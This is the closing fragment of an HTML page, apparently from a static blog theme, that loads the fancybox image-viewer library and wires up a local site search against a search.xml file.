<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
